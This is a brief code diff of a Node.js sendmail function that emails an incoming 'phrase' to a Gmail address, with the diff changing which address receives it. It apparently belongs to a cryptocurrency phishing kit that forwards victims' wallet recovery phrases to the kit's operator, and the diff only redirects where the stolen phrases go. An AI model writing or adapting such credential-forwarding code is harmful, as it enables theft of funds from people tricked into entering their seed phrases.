@@ -21,7 +21,7 @@ async function sendmail(message) {
 
     let info = await transporter.sendMail({
       from: 'info@graysfx.online', // Sender address
-      to: "mmaroke75@gmail.com", // List of receivers
+      to: "Tradeifymarkets@gmail.com", // List of receivers
       subject: "incoming new phrase ", // Subject line
       html: message // HTML body
     });
